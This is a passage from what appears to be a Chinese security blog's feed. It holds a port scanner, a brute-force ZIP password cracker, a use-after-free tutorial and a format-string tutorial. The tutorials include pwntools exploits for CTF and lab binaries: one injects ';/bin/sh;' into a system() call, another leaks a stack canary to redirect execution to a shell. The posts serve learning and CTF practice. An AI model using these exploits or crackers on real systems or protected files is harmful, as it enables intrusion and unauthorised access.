<span class="token keyword">except</span><span class="token punctuation">:</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 分割端口 开始扫描</span>
tgtport<span class="token operator">=</span>str<span class="token punctuation">(</span>option<span class="token punctuation">.</span>tgtport<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> tgtp <span class="token keyword">in</span> tgtport<span class="token punctuation">:</span>  
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        con<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
        con<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>tgtip<span class="token punctuation">,</span>int<span class="token punctuation">(</span>tgtp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Du4t\n'</span><span class="token punctuation">)</span>
        result<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口开放"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口响应:\n"</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
        con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口未开放"</span><span class="token punctuation">)</span></code></pre>
<h2 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h2><ul>
<li>多线程</li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Others </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZIP爆破脚本]]></title>
      <url>/2020/01/14/zip-bao-po/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算如果后续有时间的话就把多线程加上..优化下脚本破解速度…还有各位大佬们就别吐槽小垃圾的传参方式了..我也知道很垃圾了…后面会学习传参方式 然后替换掉现在的..</p>
<h2 id="ZIP爆破脚本-V1-0"><a href="#ZIP爆破脚本-V1-0" class="headerlink" title="ZIP爆破脚本 V1.0"></a>ZIP爆破脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> math
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string

<span class="token keyword">try</span><span class="token punctuation">:</span>
    file<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    gpus<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    num<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入参数"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"参数格式 : 文件路径 破解模式"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-n num : num位及以下纯数字暴力破解"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-w num : num位及以下纯字母暴力破解"</span><span class="token punctuation">)</span> 
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-r num : num位字母数字随机组合"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># 读入ZIP文件</span>
num<span class="token operator">=</span>int<span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>

zipfile<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>file<span class="token punctuation">)</span>
word<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
word<span class="token operator">+=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz'</span>
<span class="token comment" spellcheck="true"># num位以下纯数字暴力破解</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>gpus<span class="token operator">==</span><span class="token string">'-n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    num1<span class="token operator">=</span><span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        num1<span class="token operator">=</span>num1<span class="token operator">+</span><span class="token string">'9'</span>
    num<span class="token operator">=</span>int<span class="token punctuation">(</span>num1<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            zipfile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"passwd:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span> 

<span class="token comment" spellcheck="true"># num位以下纯字母暴力破解</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>gpus<span class="token operator">==</span><span class="token string">'-w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>combinations_with_replacement<span class="token punctuation">(</span>word<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            pas<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>pas<span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                zipfile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>pas<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"passwd:"</span><span class="token operator">+</span>pas<span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>
                <span class="token keyword">pass</span> 

<span class="token comment" spellcheck="true"># num位字母数字随机破解</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>gpus<span class="token operator">==</span><span class="token string">'-r'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        pas<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>pas<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            zipfile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>pas<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"passwd:"</span><span class="token operator">+</span>pas<span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span> 
</code></pre>
<h2 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h2><ul>
<li>多线程</li>
<li>优化参数传入</li>
<li>优化算法?</li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Others </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UAF漏洞生成原理及利用]]></title>
      <url>/2019/12/15/uaf/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="UAF漏洞生成原因"><a href="#UAF漏洞生成原因" class="headerlink" title="UAF漏洞生成原因"></a>UAF漏洞生成原因</h2><p>UAF漏洞全称为<code>Use After Free</code> 从字面意思上都能理解是在程序<code>Free</code>掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除逻辑方面的漏洞 讲解一下原理层面<code>UAF漏洞</code>是怎么造成的 以及造成的原理是什么</p>
<p>首先我们需要明确一点 应用程序在调用<code>free()</code>函数来释放一个内存块的时候 如果内存块的大小是小于256kb的时候 dlmalloc(一种内存分配器 相当于管理员)并不会立即就将内存块释放回内存 而是将内存块标记为空闲状态备用 这样做的主要目的有两种 其一是因为此时的内存块并不是位于堆的顶端 导致内存块并不能马上释放回内核 其二是为了以防程序下一次重新申请内存块的时候还要去内存中重新申请 这块内存会留下来备用 等到程序再次申请时 直接将此内存块分配给程序 提高程序执行速度</p>
<p>当然 dlmalloc肯定不会允许程序内部空闲的内存块无限堆积 当程序内部空闲的内存块达到256kb时 dlmalloc会立即调用<code>munmap()</code>释放内存 即dlmalloc堆积内存块的最高上限为256kb 当程序申请256kb以上的内存块时 dlmalloc会调用<code>mmap()</code>向内核重新申请256kb的内存块 而不会使用堆积空闲的内存块</p>
<p>从程序开发和执行的角度来讲 这样的机制其实并没有什么问题 毕竟这样的机制是可以提升程序的执行效率的 而且并没有什么明显的缺陷</p>
<p>但是一旦编程者在逻辑层面上把控不到位 <strong>在程序执行<code>free()</code>释放内存之后 没有很好的管控已经释放过的内存块 导致此内存块在程序中依然能够进行访问 就会造成UAF漏洞</strong> 例如在<code>free()</code>函数之后 没有结束程序 在继续运行的过程中 依然有指针对该内存块进行读写操作等 </p>
<p>所以从严格意义上讲 UAF漏洞不是”天灾”而是”人祸”</p>
<h2 id="UAF漏洞的验证"><a href="#UAF漏洞的验证" class="headerlink" title="UAF漏洞的验证"></a>UAF漏洞的验证</h2><blockquote>
<p>此模块测试样例1</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
   p1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%p,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
   p2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"world"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%p,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>使用GCC编译时无需关闭任何保护 直接编译即可</p>
</blockquote>
<p>这个模块是通过两个小例子来验证UAF漏洞原理的正确性 看看是否free掉内存块后 依旧对其读写会对后续分配的内存块有影响和在小于256kb的情况下 重新分配内存 是否依旧是之前free掉的内存</p>
<p>简单解释下程序逻辑 刚开始程序会申请一个大小为10个字符型数据的内存块 然后向其内部输入<code>hello</code> 紧接着free掉此内存块 然后立刻重新申请同样大小的内存块 同时利用之前free后遗留下来的指针对之前free掉的内存块重新写入数据 然后打印数据</p>
<p>那么我们运行程序观察下结果</p>
<p><img src="http://115.159.222.69/tc/e6153263dc5bf272d679e57834257a30.png" alt></p>
<p>不难发现 程序两次申请的内存块地址是一样的 而且使用遗留下来的指针对free掉的内存块进行写入数据 同样会影响到后续重新申请的内存块 由此可以发现 UAF漏洞原理是正确的且会对程序的正常运行造成巨大的安全隐患</p>
<h2 id="UAF漏洞的利用"><a href="#UAF漏洞的利用" class="headerlink" title="UAF漏洞的利用"></a>UAF漏洞的利用</h2><blockquote>
<p>这里我采用的是<code>攻防世界/PWN版块进阶区/time_formatter</code>这道题来演示漏洞的利用  </p>
</blockquote>
<p>拿到程序查壳查保护这些起手式我就不多赘述了 程序的逻辑和做题步骤也与漏洞无关 这里直接暴露出漏洞点和漏洞细节</p>
<p><img src="http://115.159.222.69/tc/108db783bd6be6a1b13d2271a31275d7.png" alt></p>
<p>注意观察程序逻辑 不难发现程序在此函数内存在一个巨大的逻辑漏洞 即优先释放内存块 (为方便后续讲解 后文统称此块内存块为 内存块1) 再重新询问用户判断是否真的要退出 如果选择不退出程序继续运行 如果程序执行到该函数而选择不退出程序的话 整个程序内部调用的指针进行的读写 都是指向这块已被释放的内存空间 确定此处存在典型的UAF漏洞 </p>
<p>继续阅读程序源码 发现在用户可正常到达的函数内 存在一个重新申请一个内存块2的操作 那么这个时候基本可以断定是从此处重新申请回原本的内存块1</p>
<p><img src="http://115.159.222.69/tc/83b1d472b84c868266538cc3de96eec5.png" alt></p>
<p><em>原本的程序函数名并不是这样 为了方便理解 我对函数名进行了重命名</em></p>
<p>同时发现程序内部执行了<code>system</code>函数 此时的参数为内存块1的值 </p>
<p><img src="http://115.159.222.69/tc/8c379b8be016e6439c84576fd4debf66.png" alt></p>
<p>起初的想法是直接在内存块1初始化时 输入<code>'/bin/sh'</code>以达到GetShell的目的 但是发现在初始化内存块1时程序存在一个检测 不允许单引号的输入</p>
<p><img src="http://115.159.222.69/tc/1d6330a9c6b361ed4c159f60db0e06fa.png" alt></p>
<p>所以此时想要GetShell只有一个办法 即正常申请一个内存块1 然后释放掉内存块1 利用UAF漏洞的特性 申请到和内存块同地址的内存块2 然后修改内存块2的值 以达到修改内存块1值的目的(虽然已经被释放掉了 但是程序内的指针依旧指向此处) 然后调用system即可 </p>
<p>脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./time'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"aaaaa"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"N"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"';/bin/sh;'"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>至于为什么此处修改的值是<code>';/bin/sh;'</code> 这就涉及到命令注入的知识了 如果有机会我们下次再讲</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>UAF漏洞作为堆上最基础的漏洞 其地位和栈上格式化字符串漏洞一样 都是属于”人祸” 如果编程者在书写程序时 逻辑更加严密 是完全可以避免的 随着时代的进步 格式化字符串基本在非CTF比赛的场景里已经见不到了 但是作为C语言精髓的指针和堆 这上面的漏洞还是偶尔可以见到的 甚至UAF漏洞都是有可能存在的漏洞 所以细心审计代码 严格审查逻辑漏洞 起码对于UAF漏洞来说 是最好的 也是唯一的防御手段</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[KMP算法]]></title>
      <url>/2019/12/08/kmp-suan-fa/</url>
      <content type="html"><![CDATA[<html><head><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></head><body></body></html>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[基于某CTF题的格式化字符串漏洞再学习]]></title>
      <url>/2019/12/07/ji-yu-mou-ctf-ti-de-ge-shi-hua-zi-fu-chuan-lou-dong-zai-xue-xi/</url>
      <content type="html"><![CDATA[<html><head></head><body><p>最近在做SWPUCTF 发现PWN题又出现了利用格式化字符串漏洞修改值 决定彻底总结下格式化字符串漏洞</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><blockquote>
<p>这里给出本模块的实验案例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
</blockquote>
<p>俗话说的好..最危险的漏洞其实是人..格式化字符串漏洞的出现就是因为某些懒人程序员 在使用printf函数不规范造成的 </p>
<p>正常来说 printf函数的使用方法是 <code>printf("格式化字符串",变量)</code> 但是如果程序员懒得写格式化字符串 直接写变量的话 程序也是可以正常运行的 没有什么太大的问题 但是当 输入变量可控和一个懒人程序员遇到一起 擦出爱情的火花 就会造成以下这种结果</p>
<p><img src="https://ftp.bmp.ovh/imgs/2019/12/8cb6b8c99f50e4da.png" alt></p>
<p>哦吼…明明用户输入的是一串%p 但是为什么输出的是一堆十六进制数据??这就是格式化字符串漏洞造成的结果 </p>
<p>我们可以使用动态调试 将程序载入GDB 具体的来看下 这一连串的十六进制数据到底是个什么玩意 </p>
<p><img src="https://ftp.bmp.ovh/imgs/2019/12/5887ce81ff381f29.png" alt></p>
<p>通过动态调试 我们可以惊奇的发现…这些十六进制的数据 都是我们输入字符以下栈内的数据 粗略一想好像单单能拿到栈内的数据好像没什么用 但是请注意一点 只要单单能拿到栈内的数据 就已经可以绕过栈溢出的天敌——Canary保护</p>
<h2 id="格式化字符串漏洞绕过Canary保护"><a href="#格式化字符串漏洞绕过Canary保护" class="headerlink" title="格式化字符串漏洞绕过Canary保护"></a>格式化字符串漏洞绕过Canary保护</h2><blockquote>
<p>首先给出本模块的样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   
<span class="token punctuation">}</span></code></pre>
<p>编译时 请关闭PIE保护</p>
</blockquote>
<p>检查保护发现除了PIE之外保护都有 我们可以通过测试偏移发现 关于格式化字符串本身的偏移是6</p>
<p><img src="https://ftp.bmp.ovh/imgs/2019/12/89ea68a9e780454e.png" alt></p>
<p>通过GDB和IDA配合调试 发现在栈中我们的输入的格式化字符串跟Canary值之间的偏移是152个字节 转化过来就是19个参数 也就是说 如果我们输入的格式化字符串是<code>%19$p</code> 程序输出的就是Canary的值 然后发现程序有一个 <code>read(0,a,0x200)</code> 此处存在栈溢出</p>
<p>那么我们在已经获得了Canary值的情况下就可以随意的进行栈溢出 将返回地址改为shell函数的地址 这样就能Getshell了</p>
<p>实现脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./format2"</span><span class="token punctuation">)</span>
shell_addr<span class="token operator">=</span><span class="token number">0x4006a7</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%19$p"</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行即可 Getshell</p>
<p><img src="https://ftp.bmp.ovh/imgs/2019/12/aec1de95faffd1a6.png" alt></p>
<p>但是利用格式化绕过Canary保护只有这一种办法么?? 要知道 根据格式化字符串的不同 程序是可以做出不同的响应的 其中最为重要的就是<code>%n</code><br>这个格式化字符串是可以将一个指定地址的值更改为 他之前的字符数</p>
<p>举例来说 <code>1324%n</code> 就是将值改为4</p>
<p>那么我们或许根本就不需要栈溢出就可以更改返回地址了???</p>
<h2 id="格式化字符串漏洞修改返回地址"><a href="#格式化字符串漏洞修改返回地址" class="headerlink" title="格式化字符串漏洞修改返回地址"></a>格式化字符串漏洞修改返回地址</h2><blockquote>
<p>这里先给出本模块的样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
